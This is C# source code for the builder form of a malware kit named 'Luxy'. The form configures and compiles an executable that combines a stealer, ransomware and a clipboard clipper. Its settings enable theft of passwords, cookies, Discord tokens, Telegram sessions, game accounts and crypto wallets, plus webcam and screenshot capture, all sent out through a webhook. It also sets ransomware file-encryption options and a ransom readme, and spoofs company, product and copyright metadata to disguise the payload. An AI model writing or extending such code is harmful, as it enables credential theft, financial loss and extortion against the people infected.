using System;
using System.Windows.Forms;
using System.Threading;

namespace Luxy
{
    public partial class BuilderForm : Form
    {
        StealerForm stealerForm = new StealerForm();
        RansomewareForm ransomewareForm = new RansomewareForm();

        public BuilderForm()
        {
            InitializeComponent();
        }

        private void build_btn_Click(object sender, EventArgs e)
        {
            bool[] stealer_settings = stealerForm.Stealer_settings;
            string[] ransomware_settings = ransomewareForm.Ransomware_settings;

            Settings.StealerModule = stealer_ts.Checked;
            Settings.RansomewareModule = ransomeware_ts.Checked;
            Settings.ClipperModule = clipper_ts.Checked;

            if (webhook_stealer_url_tb.Text == "" && Settings.StealerModule)
            {
                GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Warning;
                GunaMessageBox.Show("Webhook can not be empty.", "Warning");
                return;
            }

            if (webhook_ransomware_tb.Text == "" && Settings.RansomewareModule)
            {
                GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Warning;
                GunaMessageBox.Show("Webhook can not be empty.", "Warning");
                return;
            }

            if (!Settings.StealerModule && !Settings.RansomewareModule && !Settings.ClipperModule)
            {
                GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Warning;
                GunaMessageBox.Show("There is no module enabled.", "Warning");
                return;
            }

            Settings.WebhookStealer = webhook_stealer_url_tb.Text;
            Settings.StealPasswords = stealer_settings[0];
            Settings.StealCookies = stealer_settings[1];
            Settings.StealDiscordToken = stealer_settings[2];
            Settings.StealGames = stealer_settings[3];
            Settings.StealTelegramSessions = stealer_settings[4];
            Settings.StealSystemInfo = stealer_settings[5];
            Settings.Netwrok = stealer_settings[6];
            Settings.StealWallets = stealer_settings[7];
            Settings.TakeWebcam = stealer_settings[8];
            Settings.TakeScreenshot = stealer_settings[9];

            Settings.WebhookRansomeware = webhook_ransomware_tb.Text;
            Settings.EncryptExtension = ransomware_settings[0];
            Settings.EncryptExtensionList = ransomware_settings[1];
            Settings.ReadMeMessage = ransomware_settings[2];

            Settings.CompanyName = company_tb.Text;
            Settings.Description = description_tb.Text;
            Settings.ProductName = product_tb.Text;
            Settings.LegalCopyright = company_tb.Text;
            Settings.LegalTrademarks = trademarks_tb.Text;
            Settings.InternalName = internal_tb.Text;
            Settings.OriginalFilename = original_name_tb.Text;

            Settings.IconPath = icon_path_tb.Text;

            var fileDialog = new SaveFileDialog();
            fileDialog.Title = "Build";
            fileDialog.Filter = "Excutable file (*.exe)|*.exe";
            fileDialog.DefaultExt = "exe";
            fileDialog.FileName = "Luxy.exe";
            if (fileDialog.FileName == "" || fileDialog.ShowDialog() == DialogResult.Cancel)
            {
                return;
            }
            Thread buildTh = new Thread(() => Components.Builder.Builder.Build(fileDialog.FileName));
            buildTh.IsBackground = true;
            buildTh.Start();
            //Components.Builder.Builder.Build(fileDialog.FileName, progressBar);
        }

        private void setting_setealer_btn_Click(object sender, EventArgs e)
        {
            stealerForm.ShowDialog();
        }

        private void setting_ransomware_btn_Click(object sender, EventArgs e)
        {
            ransomewareForm.ShowDialog();
        }

        private void check_webhook_btn_Click(object sender, EventArgs e)
        {
            string message = @"{
                ""content"": ""This Webhook is Working!""
                }";
            Webhook.PostJson(webhook_stealer_url_tb.Text, message);
            GunaMessageBox.Buttons = Guna.UI2.WinForms.MessageDialogButtons.OK;
            GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Information;
            GunaMessageBox.Show("Check Webhook Message in your server!", "Webhook");
        }

        private void select_icon_btn_Click(object sender, EventArgs e)
        {
            var fileDialog = new OpenFileDialog();
            fileDialog.Filter = "ico files (*.ico)|*.ico";
            fileDialog.Title = "Select Icon";
            fileDialog.ShowDialog();
            if (fileDialog.FileName == "")
            {
                return;
            }
            icon_path_tb.Text = fileDialog.FileName;
        }
    }
}
